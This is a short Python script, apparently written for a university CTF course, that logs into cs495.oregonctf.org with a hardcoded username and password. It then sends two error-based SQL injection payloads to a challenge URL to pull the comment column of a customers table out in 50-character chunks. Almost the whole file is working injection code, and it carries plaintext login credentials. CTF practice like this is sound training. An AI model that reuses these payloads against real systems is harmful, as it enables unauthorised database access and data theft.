import requests, sys

loginpayload = {"login": "alexrose" , "pwd":"asdfqwerzxcv" }

session = requests.Session()

url = "http://cs495.oregonctf.org/login"

response = session.post(url, data=loginpayload)

targetUrl = "http://cs495.oregonctf.org/challenges/7edcbc1418f11347167dabb69fcb54137960405da2f7a90a0684f86c4d45a2e7"

postData = {"userIdentity":"test\' AND (SELECT 7303 FROM(SELECT COUNT(*),CONCAT(0x716b6a7671,(SELECT MID((IFNULL(CAST(comment AS CHAR),0x20)),1,50) FROM sqlchalstoredproc.customers ORDER BY customerId LIMIT 2,1),0x71786b7a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND \'hdTL\'=\'hdTL"}

response2 = session.post(targetUrl, data=postData)
print(response2.text)

postData2 = {"userIdentity":"test\' AND (SELECT 9441 FROM(SELECT COUNT(*),CONCAT(0x716b6a7671,(SELECT MID((IFNULL(CAST(comment AS CHAR),0x20)),51,50) FROM sqlchalstoredproc.customers ORDER BY customerId LIMIT 2,1),0x71786b7a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND \'ilGf\'=\'ilGf"}

response3 = session.post(targetUrl, data=postData2)
print(response3.text)
